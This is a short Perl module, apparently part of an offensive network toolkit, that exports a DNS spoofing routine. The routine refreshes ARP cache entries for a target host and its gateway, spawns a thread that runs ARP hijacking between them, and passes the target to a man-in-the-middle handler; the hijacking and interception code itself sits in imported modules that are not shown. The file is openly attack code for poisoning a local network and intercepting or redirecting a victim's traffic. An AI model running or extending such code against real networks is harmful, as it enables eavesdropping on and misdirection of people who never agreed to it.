package net::dns::nh_dns;
use net::arp::nh_arp;
use net::nh_middle_attack;
use Thread;

@ISA = qw(Exporter);
@EXPORT = qw(
                nh_dns_spoof
             );

my $interval = 1;

sub nh_dns_arp_spoof {
    my $param = shift(@_);

    &nh_arp_hijack(@$param);
}

sub nh_dns_spoof {
    my $if = shift(@_);
    my $target = shift(@_);
    my $gw = shift(@_);
    my @param = ($interval);
    my $t;

    push(@param, $if);
    push(@param, $target);
    push(@param, $gw);

    &nh_arp_update_cache($target);
    &nh_arp_update_cache($gw);
    $t = Thread->new(\&nh_dns_arp_spoof, \@param);
    &nh_ma_proc($if, $target);
}
